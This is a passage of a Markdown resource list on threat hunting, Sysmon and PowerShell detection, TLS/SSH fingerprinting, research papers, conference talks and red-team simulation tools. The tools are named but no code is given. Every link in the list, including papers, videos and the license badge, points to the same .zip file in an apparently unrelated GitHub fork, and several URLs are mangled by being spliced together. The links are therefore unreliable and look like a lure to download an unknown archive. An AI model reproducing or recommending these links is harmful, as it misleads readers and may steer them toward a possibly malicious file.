##### Sysmon

- [Splunking the Endpoint: Threat Hunting with Sysmon](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
    - [Hunting with Sysmon](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Threat Hunting with Sysmon: Word Document with Macro](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- Chronicles of a Threat Hunter: Hunting for In-Memory Mimikatz with Sysmon and ELK
    - [Part I (Event ID 7)](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
    - [Part II (Event ID 10)](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- Advanced Incident Detection and Threat Hunting using Sysmon (and Splunk) ([botconf 2016 Slides](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip), [FIRST 2017 Slides](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip))
- [The Sysmon and Threat Hunting Mimikatz wiki for the blue team](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Splunkmon — Taking Sysmon to the Next Level](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Sysmon Threat Detection Guide](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) ([PDF](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip))

##### PowerShell

- Revoke-Obfuscation: PowerShell Obfuscation Detection Using Science ([Paper](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip%https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip), [Slides](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip%https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip))
- [Hunting the Known Unknowns (With PowerShell)](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [HellsBells, Let's Hunt PowerShells!](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Hunting for PowerShell Using Heatmaps](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)

#### Fingerprinting

- [JA3: SSL/TLS Client Fingerprinting for Malware Detection](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [TLS Fingerprinting with JA3 and JA3S](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [HASSH - a profiling method for SSH Clients and Servers](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
    - [HASSH @BSides Canberra 2019 - Slides](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip%202019%20%20-%20HASSH%20-%20a%20Profiling%20Method%20for%20SSH%20Clients%20and%https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Finding Evil on the Network Using JA3/S and HASSH](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [RDP Fingerprinting - Profiling RDP Clients with JA3 and RDFP](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Effective TLS Fingerprinting Beyond JA3](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [TLS Fingerprinting in the Real World](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [HTTP Client Fingerprinting Using SSL Handshake Analysis](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) (source code: [mod_sslhaf](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [TLS fingerprinting - Smarter Defending & Stealthier Attacking](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [JA3er](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - a DB of JA3 fingerprints
- [An Introduction to HTTP fingerprinting](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [TLS Fingerprints](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) collected from the University of Colorado Boulder campus network
- [The use of TLS in Censorship Circumvention](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [TLS Beyond the Browser: Combining End Host and Network Data to Understand Application Behavior](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [HTTPS traffic analysis and client identification using passive SSL/TLS fingerprinting](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Markov Chain Fingerprinting to Classify Encrypted Traffic](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [HeadPrint: Detecting Anomalous Communications through Header-based Application Fingerprinting](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)

#### Research Papers

- [Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [The Diamond Model of Intrusion Analysis](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [EXPOSURE: Finding Malicious Domains Using Passive DNS Analysis](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip~https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- A Comprehensive Approach to Intrusion Detection Alert Correlation ([Paper](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip~https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip), [Dissertation](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip))
- [On Botnets that use DNS for Command and Control](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip~https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Intelligent, Automated Red Team Emulation](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Machine Learning for Encrypted Malware Traffic Classification](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)

#### Blogs

- [David Bianco's Blog](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [DFIR and Threat Hunting Blog](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [CyberWardog's Blog](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) ([old](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip))
- [Chris Sanders' Blog](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Kolide Blog](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Anton Chuvakin](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Alexandre Teixeira](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)

### Videos

- [SANS Threat Hunting and IR Summit 2017](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [SANS Threat Hunting and IR Summit 2016](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [BotConf 2016 - Advanced Incident Detection and Threat Hunting using Sysmon and Splunk](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [BSidesCharm 2017 - Detecting the Elusive: Active Directory Threat Hunting](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [BSidesAugusta 2017 - Machine Learning Fueled Cyber Threat Hunting](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Toppling the Stack: Outlier Detection for Threat Hunters](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [BSidesPhilly 2017 - Threat Hunting: Defining the Process While Circumventing Corporate Obstacles](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Black Hat 2017 - Revoke-Obfuscation: PowerShell Obfuscation Detection (And Evasion) Using Science](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [DefCon 25 - MS Just Gave the Blue Team Tactical Nukes](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [BSides London 2017 - Hunt or be Hunted](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [SecurityOnion 2017 - Pivoting Effectively to Catch More Bad Guys](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [SkyDogCon 2016 - Hunting: Defense Against The Dark Arts](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [BSidesAugusta 2017 - Don't Google 'PowerShell Hunting'](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [BSidesAugusta 2017 - Hunting Adversaries w Investigation Playbooks & OpenCNA](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Visual Hunting with Linked Data](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [RVAs3c - Pyramid of Pain: Intel-Driven Detection/Response to Increase Adversary's Cost](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [BSidesLV 2016 - Hunting on the Endpoint w/ Powershell](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Derbycon 2015 - Intrusion Hunting for the Masses A Practical Guide](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [BSides DC 2016 - Practical Cyborgism: Getting Start with Machine Learning for Incident Detection](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [SANS Webcast 2018 - What Event Logs? Part 1: Attacker Tricks to Remove Event Logs](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Profiling And Detecting All Things SSL With JA3](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [ACoD 2019 - HASSH SSH Client/Server Profiling](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [QueryCon 2018](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - An annual conference for the osquery open-source community ([https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip))
- [Visual Hunting with Linked Data Graphs](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [SecurityOnion Con 2018 - Introduction to Data Analysis](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)

### Trainings

- [SANS SEC555](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - SIEM with Tactical Analytics.
- [SpecterOps Adversary Tactics: PowerShell](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) (FREE)
- [SpecterOps Adversary Tactics: Detection](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [eLearnSecurity THP](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Threat Hunting Professional


### Twitter

- ["Awesome Detection" Twitter List](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Security guys who tweet about threat detection, hunting, DFIR, and red teaming

## Threat Simulation

A curated list of awesome adversary simulation resources

### Tools

- [MITRE CALDERA](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - An automated adversary emulation system that performs post-compromise adversarial behavior within Windows Enterprise networks.
- [APTSimulator](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A Windows Batch script that uses a set of tools and output files to make a system look as if it was compromised.
- [Atomic Red Team](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Small and highly portable detection tests mapped to the Mitre ATT&CK Framework.
- [Network Flight Simulator](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - flightsim is a lightweight utility used to generate malicious network traffic and help security teams to evaluate security controls and network visibility.
- [Metta](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A security preparedness tool to do adversarial simulation.
- [Red Team Automation (RTA)](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - RTA provides a framework of scripts designed to allow blue teams to test their detection capabilities against malicious tradecraft, modeled after MITRE ATT&CK.
- [SharpShooter](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Payload Generation Framework.
- [CACTUSTORCH](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Payload Generation for Adversary Simulations.
- [DumpsterFire](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A modular, menu-driven, cross-platform tool for building repeatable, time-delayed, distributed security events.
- [Empire](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)([website](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)) - A PowerShell and Python post-exploitation agent.
- [PowerSploit](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A PowerShell Post-Exploitation Framework.
- [RedHunt-OS](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A Virtual Machine for Adversary Emulation and Threat Hunting. RedHunt aims to be a one stop shop for all your threat emulation and threat hunting needs by integrating attacker's arsenal as well as defender's toolkit to actively identify the threats in your environment.
- [Infection Monkey](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - An open source Breach and Attack Simulation (BAS) tool that assesses the resiliency of private and public cloud environments to post-breach attacks and lateral movement.
- [Splunk Attack Range](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A tool that allows you to create vulnerable instrumented local or cloud environments to simulate attacks against and collect the data into Splunk.


### Resources

- [MITRE's Adversary Emulation Plans](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Awesome Red Teaming](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A list of awesome red teaming resources
- [Red-Team Infrastructure Wiki](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Wiki to collect Red Team infrastructure hardening resources.
- [Payload Generation using SharpShooter](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [SpecterOps Blog](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
    - [Threat Hunting](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Advanced Threat Tactics](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A free course on red team operations and adversary simulations.
- [Signal the ATT&CK: Part 1](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Modelling APT32 in CALDERA 
- [Red Teaming/Adversary Simulation Toolkit](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A collection of open source and commercial tools that aid in red team operations.
- [C2 Matrix](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) ([Google Sheets](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip))

## Contribute

Contributions welcome! Read the [contribution guidelines](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) first.


## License

[![CC0](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)

To the extent possible under law, Adel &#34;0x4D31&#34; Karimi has waived all copyright and
related or neighboring rights to this work.
